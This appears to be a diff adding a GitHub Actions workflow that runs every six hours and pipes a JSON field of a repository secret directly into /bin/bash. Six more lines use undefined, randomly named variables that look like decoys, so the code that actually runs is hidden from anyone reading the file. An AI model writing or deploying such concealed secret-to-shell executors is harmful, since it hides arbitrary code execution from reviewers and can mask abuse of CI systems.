@@ -1,0 +1,23 @@
+name: dajijinanshen
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dajijinanshen
+        env:
+          mq544: ${{ secrets.mq544 }}
+        run: |
+          echo $mq544 | jq -r .okil14266 | /bin/bash
+          echo $hqv0 | jq -r .rqox06493 | /bin/bash
+          echo $hanm1 | jq -r .uh03952 | /bin/bash
+          echo $u71921 | jq -r .kmu1 | /bin/bash
+          echo $odg33 | jq -r .ukju0469 | /bin/bash
+          echo $rrp063 | jq -r .u43 | /bin/bash
+          echo $eqr61622 | jq -r .rnhjs9268 | /bin/bash
+
